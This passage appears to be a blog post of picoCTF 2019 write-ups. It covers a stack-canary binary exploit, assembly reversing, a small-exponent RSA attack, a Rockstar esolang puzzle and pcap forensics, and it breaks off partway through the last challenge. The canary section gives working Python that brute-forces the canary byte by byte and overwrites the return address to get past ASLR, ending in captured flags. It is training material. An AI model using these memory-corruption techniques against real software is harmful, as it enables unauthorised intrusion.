canary <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]

call(<span style="color:#ae81ff">33</span>, canary) <span style="color:#75715e"># Test the call function</span>
</code></pre></div><p>Test the script locally:</p>
<pre><code class="language-console" data-lang="console">$ python go.py
[ERROR]: Trying to Read Canary
</code></pre><p>The above error occurs because the binary is trying to open up the canary.txt file. Let&rsquo;s create it:</p>
<pre><code class="language-console" data-lang="console">$ echo -n ASDF &gt; canary.txt
</code></pre><p>The error still occurs:</p>
<pre><code class="language-console" data-lang="console">$ python go.py
[ERROR]: Trying to Read Canary
</code></pre><p>This is because the vuln binary has the path to canary.txt hard coded.</p>
<p>Use a hex editor to change the hardcoded path which looks like the following:</p>
<pre><code>/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/canary.txt
</code></pre><p>to something like <code>canary.txt</code>. After patching the binary, the program will look for the canary.txt in the current directory.</p>
<p>Now the script works:</p>
<pre><code class="language-console" data-lang="console">$ python go.py
Please enter the length of the entry:
&gt; Input&gt; *** Stack Smashing Detected *** : Canary Value Corrupt!
</code></pre><p>Now we have to use our script call() function to brute force the stack value.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call</span>(sz, t):
  <span style="color:#66d9ef">assert</span> sz<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">32</span>
  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%i</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> sz <span style="color:#75715e"># size of our input</span>
  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#75715e"># To fill the buf buffer</span>
  payload <span style="color:#f92672">+=</span> chr(t[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>

  p <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#34;./vuln&#34;</span>], stdin<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE) 
  (stdout, stderror) <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate(payload)

  <span style="color:#75715e">#print stdout</span>
  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Stack Smashing Detected&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> stdout

canary <span style="color:#f92672">=</span> [<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>]

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">4</span>):
  <span style="color:#66d9ef">for</span> j <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">256</span>):
    canary[i] <span style="color:#f92672">=</span> j
    <span style="color:#66d9ef">if</span> call(<span style="color:#ae81ff">33</span> <span style="color:#f92672">+</span> i, canary):
      <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%i</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> j
      <span style="color:#66d9ef">break</span>

<span style="color:#75715e">#call(33, canary) # Test the call function</span>
</code></pre></div><p>The script works locally:</p>
<pre><code class="language-console" data-lang="console">$ python go.py
65
83
68
70
</code></pre><p>Testing on remote (make sure to change the path in the script):</p>
<pre><code class="language-console" data-lang="console">$ python ~/go.py
51
51
120
79
</code></pre><p>The four bytes of the canary on the remote are 51, 51, 120, 79.</p>
<p>With the canary value now figured out, we can now make the payload. We have to deal with ASLR. ASLR moves around memory pages, but not the contents. This means the lowest 3 nibbles (lowest 3 hex digits) of the addresses stays constant.</p>
<p>If we look at the address of display_flag() it says 0x000007ed (using IDA, Ghidra, or objdump). This means that the last few digits <code>7ed</code> will reman constant while the rest will change because of ASLR.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> subprocess

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">call</span>(sz, t, stuff<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>):
  <span style="color:#66d9ef">assert</span> sz<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">32</span>
  payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%i</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> sz <span style="color:#75715e"># size of our input</span>
  payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span> <span style="color:#75715e"># To fill the buf buffer</span>
  payload <span style="color:#f92672">+=</span> chr(t[<span style="color:#ae81ff">0</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">1</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">2</span>]) <span style="color:#f92672">+</span> chr(t[<span style="color:#ae81ff">3</span>]) <span style="color:#f92672">+</span> stuff <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>

  p <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>Popen([<span style="color:#e6db74">&#34;/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0/vuln&#34;</span>], stdin<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE, stdout<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>PIPE) 
  (stdout, stderror) <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate(payload)

  <span style="color:#66d9ef">print</span> stdout
  <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Stack Smashing Detected&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> stdout

canary <span style="color:#f92672">=</span> [<span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">51</span>, <span style="color:#ae81ff">120</span>, <span style="color:#ae81ff">79</span>] <span style="color:#75715e"># Replace with the stack canary we got from the remote server</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x10</span> <span style="color:#75715e"># Gynvael used IDA to see how many bytes were inbetween the canary and return address. It seems to be 0x10 or 16 bytes</span>
payload <span style="color:#f92672">+=</span> chr(<span style="color:#ae81ff">0xED</span>) <span style="color:#f92672">+</span> chr(<span style="color:#ae81ff">0x07</span>) <span style="color:#75715e"># We know that the last 3 nibbles of display_flag() are 0x7ed, so we know the last byte will be 0xED. We don&#39;t actually know that the penultimate byte is 0x07, we only know the &#39;7&#39; part, but if we run the script multiple times, eventually the address will hit a zero at that position. The higher bytes of display_flag() address will be the same as the address from main(). So we only need to overwrite the last two bytes of the return address.</span>


<span style="color:#75715e"># Just execute the vuln program multiple times so that eventually we get the address of display_flag() right</span>
<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(<span style="color:#ae81ff">32</span>):
  call(<span style="color:#ae81ff">32</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, canary, payload) <span style="color:#75715e"># 32 bytes for buffer + 4 bytes for canary + 0x10 bytes of stuff we don&#39;t care about + 2 bytes of the return address to overwrite</span>

</code></pre></div><p>Now run the above script on the remote server</p>
<pre><code class="language-console" data-lang="console">user@pico-2019-shell1:/problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0$ python ~/asdf.py
Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?

Please enter the length of the entry:
&gt; Input&gt; Ok... Now Where's the Flag?
picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
</code></pre><h2 id="investigative-reversing-0---forensics">Investigative Reversing 0 - Forensics</h2>
<p>We get a png and a binary. When we look at the png in a hex editor it looks like there&rsquo;s a flag at the end of it, although it&rsquo;s modified. Gynvael looks at the binary in IDA and sees that the binary appends the first 6 bytes of the flag to the png, appends the 9 next bytes after adding 5 to each of the chars, and then subtracts 3 to the next byte. Gynvael does the opposite operations on the hex to reverse what the binary did to get the flag.</p>
<h2 id="asm3---reverse-engineering">asm3 - Reverse Engineering</h2>
<p>Here&rsquo;s the asm:</p>
<pre><code class="language-assmebly" data-lang="assmebly">asm3:
        &lt;+0&gt;:   push   ebp
        &lt;+1&gt;:   mov    ebp,esp
        &lt;+3&gt;:   xor    eax,eax
        &lt;+5&gt;:   mov    ah,BYTE PTR [ebp+0x9]
        &lt;+8&gt;:   shl    ax,0x10
        &lt;+12&gt;:  sub    al,BYTE PTR [ebp+0xd]
        &lt;+15&gt;:  add    ah,BYTE PTR [ebp+0xf]
        &lt;+18&gt;:  xor    ax,WORD PTR [ebp+0x10]
        &lt;+22&gt;:  nop
        &lt;+23&gt;:  pop    ebp
        &lt;+24&gt;:  ret
</code></pre><p>Standard ebp+offset references arguments.</p>
<p>Convert to python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> struct <span style="color:#f92672">import</span> pack, unpack <span style="color:#75715e"># For converting stuff to little endian</span>

<span style="color:#e6db74">&#34;&#34;&#34; Just converts to little endian&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">dd</span>(v):
  <span style="color:#66d9ef">return</span> pack(<span style="color:#e6db74">&#34;&lt;I&#34;</span>, v)

<span style="color:#e6db74">&#34;&#34;&#34; Read word: Returns unsigned integer 16 bits from little endian&#34;&#34;&#34;</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">rw</span>(d):
  <span style="color:#66d9ef">return</span> unpack(<span style="color:#e6db74">&#34;&lt;H&#34;</span>, d)[<span style="color:#ae81ff">0</span>]

<span style="color:#75715e"># set up the stack before the asm3 function is called</span>
stack <span style="color:#f92672">=</span> bytearray(dd(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> dd(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> dd(<span style="color:#ae81ff">0xc264bd5c</span>) <span style="color:#f92672">+</span> dd(<span style="color:#ae81ff">0xb5a06caa</span>) <span style="color:#f92672">+</span> dd(<span style="color:#ae81ff">0xad761175</span>)) <span style="color:#75715e"># dd(0) are there for saved ebp and return address</span>

<span style="color:#75715e"># eax is split into different parts</span>
<span style="color:#75715e"># [    eax    ] ; 4 bytes</span>
<span style="color:#75715e"># [   ] [ ax  ] ; ax is 2 bytes</span>
<span style="color:#75715e"># [  ] [ah][al] ; ah and al are both only 1 byte</span>

<span style="color:#75715e"># &lt;+5&gt;:   mov    ah,BYTE PTR [ebp+0x9]</span>
ax <span style="color:#f92672">=</span> stack[<span style="color:#ae81ff">9</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span> <span style="color:#75715e"># grab byte at index 9 and shift left by a byte since ah is the second lowest byte</span>

<span style="color:#75715e"># &lt;+8&gt;:   shl    ax,0x10</span>
ax <span style="color:#f92672">=</span> ((ax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span>) <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">0x10</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xffff</span> <span style="color:#75715e"># First grab only 2 bytes from ax and shift left by 0x10 and then only grab 2 bytes of the result</span>

<span style="color:#75715e"># &lt;+12&gt;:  sub    al,BYTE PTR [ebp+0xd]</span>
al <span style="color:#f92672">=</span> ((ax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#f92672">-</span> stack[<span style="color:#ae81ff">0xd</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0Xff</span> <span style="color:#75715e"># Grab bottom byte of ax and subtract the byte at index 0xd. then grab only bottom byte of that</span>
ax <span style="color:#f92672">=</span> (ax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff00</span>) <span style="color:#f92672">|</span> al <span style="color:#75715e"># Zero out bottom bytes of ax and then fill bottom byte of ax with al, leaving top byte of ax unchanged</span>

<span style="color:#75715e"># &lt;+15&gt;:  add    ah,BYTE PTR [ebp+0xf]</span>
ah <span style="color:#f92672">=</span> (((ax <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>) <span style="color:#f92672">+</span> stack[<span style="color:#ae81ff">0xf</span>]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span> <span style="color:#75715e"># Take top byte from ax and add byte at index 0xf. Then get only lowest byte from it since ah is only 16 bits</span>
ax <span style="color:#f92672">=</span> (ax <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x00ff</span>) <span style="color:#f92672">|</span> (ah <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">8</span>) <span style="color:#75715e"># Transfer ah to ax by zeroing out top byte of ax and leaving bottom byte of ax unmodified </span>

<span style="color:#75715e"># &lt;+18&gt;:  xor    ax,WORD PTR [ebp+0x10]</span>
ax <span style="color:#f92672">^=</span> rw(stack[<span style="color:#ae81ff">0x10</span>:<span style="color:#ae81ff">0x12</span>])

<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;0x</span><span style="color:#e6db74">%.4x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> ax)
</code></pre></div><h2 id="minirsa---cryptography">miniRSA - Cryptography</h2>
<p>This is what we get:</p>
<pre><code>N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e: 3

ciphertext (c): 2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125
</code></pre><p>If the ciphertext is short and e is small, than you can run root e on the ciphertext.</p>
<p>Since <code>Ciphertext = m^e mod N</code>, if e is small then it&rsquo;s possible that the following condition is true <code>m^e &lt; N</code>. If <code>m^e &lt; N</code> is true, then the mod N basically has no effect, so essentially <code>ciphertext = m^e</code>. So you can get m by doing root e of ciphertext.</p>
<p>Use python</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">e <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>

c <span style="color:#f92672">=</span> <span style="color:#ae81ff">2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125</span>

a <span style="color:#f92672">=</span> pow(c, <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>e)
b <span style="color:#f92672">=</span> hex(int(a))[<span style="color:#ae81ff">2</span>:]

p <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(b)

<span style="color:#66d9ef">print</span>(p)
</code></pre></div><pre><code class="language-console" data-lang="console">$ python3 a.py
b'picoCS\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
</code></pre><p>It sort of works. Python&rsquo;s pow method uses doubles when doing a root so we lose some precision which is why it doesn&rsquo;t work all the way.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> gmpy2

e <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>

c <span style="color:#f92672">=</span> <span style="color:#ae81ff">2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125</span>

a, _ <span style="color:#f92672">=</span> gmpy2<span style="color:#f92672">.</span>iroot(c, e)

<span style="color:#66d9ef">print</span>(bytes<span style="color:#f92672">.</span>fromhex(hex(a)[<span style="color:#ae81ff">2</span>:]))
</code></pre></div><pre><code class="language-console" data-lang="console">$ python3 a.py
b'picoCTF{n33d_a_lArg3r_e_ff7cfba1}'
</code></pre><p>If you wanted to implement the above on your own you would try solving the following equation: <code>c - m ** e = 0</code> in a programmatic way (called bisection).</p>
<p>Lack of padding is also something wrong with the ciphertext.</p>
<h2 id="mus1c---general-skills">mus1c - General Skills</h2>
<p>Looks like an esoteric programming language challenge.</p>
<p><a href="https://github.com/RockstarLang/rockstar">Rockstar programming language</a>.</p>
<p>Gynvael uses <a href="https://palfrey.github.io/maiden/">this</a> Rockstar to Rust online interpreter first, but it doesn&rsquo;t seem to parse everything correctly.</p>
<p>Gynvael tries the official <a href="https://codewithrockstar.com/online/">compiler</a> instead.</p>
<p>We get the following output:</p>
<pre><code>114
114
114
111
99
107
110
114
110
48
49
49
51
114
Program completed in 195 ms
</code></pre><p>Use python to convert it to ascii</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">a <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;114
</span><span style="color:#e6db74">114
</span><span style="color:#e6db74">114
</span><span style="color:#e6db74">111
</span><span style="color:#e6db74">99
</span><span style="color:#e6db74">107
</span><span style="color:#e6db74">110
</span><span style="color:#e6db74">114
</span><span style="color:#e6db74">110
</span><span style="color:#e6db74">48
</span><span style="color:#e6db74">49
</span><span style="color:#e6db74">49
</span><span style="color:#e6db74">51
</span><span style="color:#e6db74">114
</span><span style="color:#e6db74">&#34;&#34;&#34;</span>

<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join([chr(int(x)) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> a<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>) <span style="color:#66d9ef">if</span> x])
</code></pre></div><h2 id="shark-on-the-wire-2---forensics">shark on the wire 2 - Forensics</h2>
<p>Lots of red herrings that Gynvael spent time on. Gynvael tries a lot of approaches.</p>
<p>Gynvael uses network miner, doesn&rsquo;t find too much.</p>
<p>Use strings</p>
<pre><code class="language-console" data-lang="console">$ strings capture.pcap | grep &quot;picoCTF&quot;
picoCTF Sure is fun!CmP]2
I really want to find some picoCTF flagsEmP]m=
picoCTF Sure is fun!ImP]
I really want to find some picoCTF flagsKmP]
picoCTF Sure is fun!OmP]
I really want to find some picoCTF flagsQmP]
picoCTF Sure is fun!VmP]\V
I really want to find some picoCTF flagsXmP]
picoCTF Sure is fun!\mP]
I really want to find some picoCTF flags^mP]
picoCTF Sure is fun!bmP]I
I really want to find some picoCTF flagsdmP]
picoCTF Sure is fun!hmP]
I really want to find some picoCTF flagskmP]
picoCTF Sure is fun!omP]
I really want to find some picoCTF flagsqmP]}
picoCTF Sure is fun!umP]
I really want to find some picoCTF flagswmP]
</code></pre><p>Use wireshark to look for that pico string. Gynvael notices that for UDP packets of length 1, there seems to be a character being sent. It looks like they&rsquo;re being sent to different hosts. Gynvael finds a fake flag on one of the hosts and decides to filter by destination ip 10.0.0.12 using the <code>data.len==1 and ip.dst == 10.0.0.12</code> filter. However, it seems like some of the packets are sent from different sources, so he thinks the flag is split between different streams.</p>
<p>Different approach: filter by <code>data.len ==1</code>. File-&gt; Export Packet Dissection as Json (only displayed packets, Packet bytes, all expanded).
Use python:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;asdf.json&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
  d <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(f)
<span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> d:
  a <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#e6db74">&#34;data.data&#34;</span>]
  src <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.src&#34;</span>]
  dst <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.dst&#34;</span>]

  s <span style="color:#f92672">=</span> str(bytes<span style="color:#f92672">.</span>fromhex(a))

  <span style="color:#66d9ef">print</span> (src, dst, s)

</code></pre></div><p>This just dumps the data and the src and dst ip.</p>
<p>This doesn&rsquo;t really get us anywhere. Gynvael tries sorting by destination ip and source ip but gets nowhere.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;asdf.json&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
  d <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(f)

ip_src <span style="color:#f92672">=</span> {}
ip_dst <span style="color:#f92672">=</span> {}

<span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> d:
  a <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#e6db74">&#34;data.data&#34;</span>] <span style="color:#75715e"># Get data</span>
  src <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.src&#34;</span>] <span style="color:#75715e"># Get src ips</span>
  dst <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.dst&#34;</span>] <span style="color:#75715e"># Get destination ips</span>

  a <span style="color:#f92672">=</span> a<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
  s <span style="color:#f92672">=</span> str(bytes<span style="color:#f92672">.</span>fromhex(a), <span style="color:#e6db74">&#34;ascii&#34;</span>)

  <span style="color:#75715e"># Sorts data based on ip src</span>
  <span style="color:#66d9ef">if</span> src <span style="color:#f92672">in</span> ip_src:
    ip_src[src] <span style="color:#f92672">+=</span> s
  <span style="color:#66d9ef">else</span>:
    ip_src[src] <span style="color:#f92672">=</span> s

  <span style="color:#75715e"># Sorts data based on ip dst</span>
  <span style="color:#66d9ef">if</span> dst <span style="color:#f92672">in</span> ip_dst:
    ip_dst[dst] <span style="color:#f92672">+=</span> s
  <span style="color:#66d9ef">else</span>:
    ip_dst[dst] <span style="color:#f92672">=</span> s

<span style="color:#75715e"># Prints data based on source IP</span>
<span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> ip_src<span style="color:#f92672">.</span>items():
  <span style="color:#66d9ef">print</span>(k, v)

<span style="color:#75715e"># Prints data based on destination IP</span>
<span style="color:#66d9ef">for</span> k, v <span style="color:#f92672">in</span> ip_dst<span style="color:#f92672">.</span>items():
  <span style="color:#66d9ef">print</span>(k, v)

</code></pre></div><p>Instead of filtering by data.len of 1, just filter out any non udp traffic: <code>udp and not mdns and not ssdp and not llmnr</code>. Export data as before and save as json. Gynvael thinks the last number of some source IP addresses are ascii characters that will make up the flag. For example some IP addresses are 10.0.0.66. 66 could be ascii &lsquo;B&rsquo;.</p>
<p>Use python to get the source IP addreses of the packets and see if the last decimal is ascii. If it is ascii then combine the chars to make a flag:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> json

flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>

<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;asdf.json&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
  d <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>load(f)

ip_src <span style="color:#f92672">=</span> {}
ip_dst <span style="color:#f92672">=</span> {}

<span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> d:
  <span style="color:#75715e"># Not all packets have data, so use try and except to filter out the packets without data</span>
  <span style="color:#66d9ef">try</span>:
    a <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;data&#34;</span>][<span style="color:#e6db74">&#34;data.data&#34;</span>] <span style="color:#75715e"># Get data</span>
    src <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.src&#34;</span>] <span style="color:#75715e"># Get src ips</span>
    dst <span style="color:#f92672">=</span> p[<span style="color:#e6db74">&#34;_source&#34;</span>][<span style="color:#e6db74">&#34;layers&#34;</span>][<span style="color:#e6db74">&#34;ip&#34;</span>][<span style="color:#e6db74">&#34;ip.dst&#34;</span>] <span style="color:#75715e"># Get destination ips</span>
  <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">KeyError</span>:
    <span style="color:#66d9ef">continue</span>

  a <span style="color:#f92672">=</span> a<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;:&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
  s <span style="color:#f92672">=</span> str(bytes<span style="color:#f92672">.</span>fromhex(a), <span style="color:#e6db74">&#34;ascii&#34;</span>)

  <span style="color:#75715e"># Take the src address and take the last part</span>
  x <span style="color:#f92672">=</span> int(src<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;.&#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>])

  <span style="color:#75715e"># See if the last part of the src ip is actually within the ascii range</span>
  <span style="color:#66d9ef">if</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">&lt;</span> x <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">127</span>:
    flag <span style="color:#f92672">+=</span> chr(x) <span style="color:#75715e"># Add the character</span>


<span style="color:#66d9ef">print</span>(flag)
</code></pre></div><pre><code class="language-console" data-lang="console">$ python3 go.py
ddddddddddddddddddddddddddddddBBKKKKKBBBBBBBBBBBBBKKKKKBBBKKBKBBCBBBBBeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeBBBBKKKBBKKKKBBPOONMMKdn
</code></pre><p>This doesn&rsquo;t seem to be the flag, so the aproach above is probably wrong.</p>
<p>New idea. Some of the ports are weird. Some ports are like 5112 or like 5097. If we get rid of the 5, we can get 112 or 97, which are ascii printable. Let&rsquo;s take all the packets with udp ports greater than 5000 and then get rid of the 5. Then we can try converting the ports-5000 to ascii printable characters to see if the characters will form the flag:</p>
